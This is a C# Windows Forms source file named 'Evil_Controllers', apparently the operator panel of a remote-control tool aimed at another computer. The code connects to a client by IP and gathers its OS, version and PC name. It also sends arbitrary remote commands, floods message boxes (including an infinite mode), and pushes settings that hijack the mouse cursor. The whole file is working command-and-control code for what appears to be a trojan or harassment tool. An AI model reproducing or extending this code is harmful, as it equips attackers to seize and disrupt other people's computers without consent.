using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace Evil_Controllers
{

    public partial class Form_EvilController : Form
    {
        
        public System.Windows.Forms.Timer timer_console;
        public System.Windows.Forms.Timer timer_status;
        Network net;
        Scripts script;
        static Thread netThread;
        public int MSGTYPE;
        public Form_EvilController()
        {
            net = new Network();
            script =new Scripts();
            InitializeComponent();

            script.packet = net.packet;
            script.encoder.packet = script.packet;
            script.decoder.packet = script.packet;

            timer_status = new System.Windows.Forms.Timer();
            timer_status.Tick += new EventHandler(event_updateStatus);
            timer_status.Interval = 1000;
            timer_status.Enabled = true;

            timer_console = new System.Windows.Forms.Timer();
            timer_console.Tick += new EventHandler(event_WriteToConsole);
            timer_console.Interval = 1000;       
            timer_console.Enabled = true;
            netThread = new Thread(new ThreadStart(NetThread));

            script.encoder.RequestOS();
            script.encoder.RequestVersion();
            script.encoder.RequestPCName();
            net.packet.Toggle();
        }

        private void Form_EvilController_Load(object sender, EventArgs e)
        {

        }

        public void NetThread()
        {
            EC_Console.WriteToConsole("Network Thread started.");
            while(true)
            {
                while (net != null)
                {
                    if (net.cStream != null)
                    {
                        if (net.packet.TF == false)
                        {
                            if (net.cStream.DataAvailable)
                            {
                                net.Recv();
                                script.decoder.Decode();
                                script.decoder.ExecCommands();
                                script.info.p_recv++;
                            }
                            else
                            {

                            }
                        }
                        else
                        {
                            try
                            {
                                net.Send();
                                net.packet.Toggle();
                                if (net.packet.TEF) { EC_Console.WriteToConsole("Sent:" + net.packet.strSend); net.packet.ToggleECFlag(); }
                                net.packet.ClearSendString();
                                script.info.p_sent++;
                            }
                            catch(Exception)
                            {
                                net.Disconnect();
                            }
                        }
                    }
                }
                Thread.Sleep(10);
            }
        }

        ~Form_EvilController()
        {
            if(netThread.IsAlive)
            {
                netThread.Abort();
            }
        }
        // == Timer Events == //

        public void event_WriteToConsole(object sender, EventArgs e) 
        {
            foreach (String toWrite in EC_Console.writeList.ToList())
            {
                lb_console.Items.Add(toWrite);
                EC_Console.writeList.Remove(toWrite);
            }
        }

        public void event_updateStatus(object sender, EventArgs e)
        {
            if(net.cStream!=null)
            {
                script.encoder.RequestVersion();
                script.encoder.RequestPing();
                script.encoder.RequestOPacketRecieved();
                script.encoder.RequestOPacketSent();
                net.packet.Toggle();
            }
            CheckStatus();
        }

        // == Connect == //

        private void b_connect_Click(object sender, EventArgs e)
        {
            //tb_ip.Text = "127.0.0.1";
            try
            {
                net.IP = IPAddress.Parse(tb_ip.Text);
                net.Connect();
                if (net.cStream != null)
                {
                    if (netThread.IsAlive)
                    {
                        
                    }
                    else
                    {
                        netThread = new Thread(new ThreadStart(NetThread));
                        netThread.Start();
                        script.info.c_ip_holder = net.IP.ToString();
                    }
                }

            }
            catch (Exception ex)
            {
                EC_Console.WriteToConsole("Exception thrown:" + ex.ToString());
                EC_Console.WriteToConsole("Maybe you forgot to enter an IP?");
            }
        }     
        private void b_disconnect_Click(object sender, EventArgs e)
        {
            if(net!=null)
            {
                if(netThread.IsAlive)
                {
                    netThread.Abort();
                    EC_Console.WriteToConsole("Network Thread ended.");
                }
                net.Disconnect();
            }
        }
        private void b_ping_Click_1(object sender, EventArgs e)
        {
            if (net != null)
            {
                if (net.cSocket != null)
                {
                    if (net.cStream != null)
                    {
                        script.encoder.RequestPing();
                        script.packet.Toggle();
                    }
                    else
                    {
                        EC_Console.WriteToConsole("Ping wasn't sent. No stream open to send by.");
                    }
                }
                else
                {
                    EC_Console.WriteToConsole("No socket open to send by.");
                }
            }
        }
        private void Version_Click(object sender, EventArgs e)
        {
            if (net != null)
            {
                if (net.cSocket != null)
                {
                    if (net.cStream != null)
                    {
                        script.encoder.RequestVersion();
                        script.packet.ToggleECFlag();
                        script.packet.Toggle();
                    }
                    else
                    {
                        EC_Console.WriteToConsole("No socket open to send by.");
                    }
                }
            }
        }

        // == MSG Box == //

        private void b_msg_show_Click(object sender, EventArgs e)
        {
            if (net != null)
            {
                if (net.cSocket != null)
                {
                    if (net.cStream != null)
                    {
                        script.encoder.MessageBox(
                            MSGTYPE,
                            (int)nud_spam_tospam.Value,
                            cb_msg_infinite.Checked,
                            tb_msg_toshow.Text
                            );
                        script.packet.ToggleECFlag();
                        script.packet.Toggle();
                    }
                    else
                    {
                        EC_Console.WriteToConsole("Ping wasn't sent. No stream open to send by.");
                    }
                }
                else
                {
                    EC_Console.WriteToConsole("No socket open to send by.");
                }
            }
        }
        private void bt_msg_info_Click(object sender, EventArgs e)
        {
            MSGTYPE = 1;
        }
        private void b_msg_warning_Click(object sender, EventArgs e)
        {
            MSGTYPE = 2;
        }
        private void b_msg_error_Click(object sender, EventArgs e)
        {
            MSGTYPE = 3;
        }

        // == Mouse == //

        private void b_mouse_apply_Click(object sender, EventArgs e)
        {
            if (net != null)
            {
                if (net.cSocket != null)
                {
                    if (net.cStream != null)
                    {
                        script.encoder.Mouse(

                            (int)nud_mouse_speed_Speed.Value,
                            cb_mouse_speed_grade.Checked,
                            cb_mouse_speed_random.Checked,
                            (int)nud_mouse_speed_maxval.Value,
                            (int)nud_mouse_speed_minval.Value,
                            cb_mouse_loc_random.Checked,
                            cb_mouse_loc_scanx.Checked,
                            cb_mouse_loc_scany.Checked,
                            cb_mouse_loc_invertx.Checked,
                            cb_mouse_loc_inverty.Checked,
                            (int)nud_mouse_loc_randompulse.Value);
                        script.packet.Toggle();
                    }
                    else
                    {
                        EC_Console.WriteToConsole("Ping wasn't sent. No stream open to send by.");
                    }
                }
                else
                {
                    EC_Console.WriteToConsole("No socket open to send by.");
                }
            }
        }

        // == Status == //
        private void CheckStatus()
        {
            
            if (net.cSocket != null)
            {
                if (net.cSocket.Connected)
                {
                    l_status_c_error.ForeColor = Color.Green;
                    l_status_c_os.ForeColor = Color.Green;
                    l_status_c_p_s.ForeColor = Color.Green;
                    l_status_c_p_r.ForeColor = Color.Green;
                    l_status_ip.ForeColor = Color.Green;
                    l_status_p_r.ForeColor = Color.Green;
                    l_status_p_s.ForeColor = Color.Green;
                    l_status_p_total.ForeColor = Color.Green;
                    l_status_pc_name.ForeColor = Color.Green;
                    l_status_pintime.ForeColor = Color.Green;
                    l_status_version.ForeColor = Color.Green;
                    l_status_online.ForeColor = Color.Green;

                    l_status_ip.Text = "IP: " + script.info.c_ip_holder;
                    l_status_p_r.Text = "Packets Recieved: " + Convert.ToInt32(script.info.p_recv);
                    l_status_p_s.Text = "Packets Sent: " + Convert.ToInt32(script.info.p_sent);
                    l_status_c_p_s.Text = "Client Packets Sent: " + script.info.c_p_sent;
                    l_status_c_p_r.Text = "Client Packets Recieved: " + script.info.c_p_recv;
                    l_status_p_total.Text = "Total Packets Transmitted: " +
                       (Convert.ToInt32(script.info.c_p_sent) + Convert.ToInt32(script.info.c_p_recv) + script.info.p_sent + script.info.p_recv);
                    l_status_c_os.Text = "Client OS: " + script.info.c_os;
                    l_status_version.Text = "ClientVersion: " + script.info.c_version;
                    l_status_pc_name.Text = "Client PC Name: " + script.info.c_pc_name;
                    l_status_c_error.Text = "Error: " + script.info.c_error;
                    l_status_online.Text = "Client Connected";
                }
                else
                {
                    l_status_c_error.ForeColor = Color.Red;
                    l_status_c_os.ForeColor = Color.Red;
                    l_status_c_p_s.ForeColor = Color.Red;
                    l_status_ip.ForeColor = Color.Red;
                    l_status_p_r.ForeColor = Color.Red;
                    l_status_p_s.ForeColor = Color.Red;
                    l_status_p_total.ForeColor = Color.Red;
                    l_status_pc_name.ForeColor = Color.Red;
                    l_status_version.ForeColor = Color.Red;
                    l_status_online.ForeColor = Color.Red;
                    l_status_pintime.ForeColor = Color.Red;
                    l_status_online.Text = "Connection Error";
                }
            }
            else
            {
                l_status_c_error.ForeColor = Color.Red;
                l_status_c_os.ForeColor = Color.Red;
                l_status_c_p_r.ForeColor = Color.Red;
                l_status_c_p_s.ForeColor = Color.Red;
                l_status_ip.ForeColor = Color.Red;
                l_status_p_r.ForeColor = Color.Red;
                l_status_p_s.ForeColor = Color.Red;
                l_status_p_total.ForeColor = Color.Red;
                l_status_pc_name.ForeColor = Color.Red;
                l_status_version.ForeColor = Color.Red;
                l_status_online.ForeColor = Color.Red;
                l_status_pintime.ForeColor = Color.Red;

                l_status_version.Text = "Client Version: N/A";
                l_status_ip.Text = "IP: N/A";
                l_status_pintime.Text = "Ping: N/A";
                l_status_pc_name.Text = "PC Client Name: N/A" ;
                l_status_c_os.Text = "Client OS: N/A" ;
                l_status_online.Text = "Client Offline";
                
            }
        }

        private void l_status_online_Click(object sender, EventArgs e)
        {

        }

        private void b_remotecmd_send_Click(object sender, EventArgs e)
        {
            if (net.cStream != null)
            {
                EC_Console.WriteToConsole(cb_cmd_msgtosend.Text);
                script.encoder.Command(cb_cmd_msgtosend.Text);
                net.packet.Toggle();
            }
            else
            {
                EC_Console.WriteToConsole("No stream open to send to.");
            }
        }

        // == Keyboard == //


        // == CMD == //

    }
}
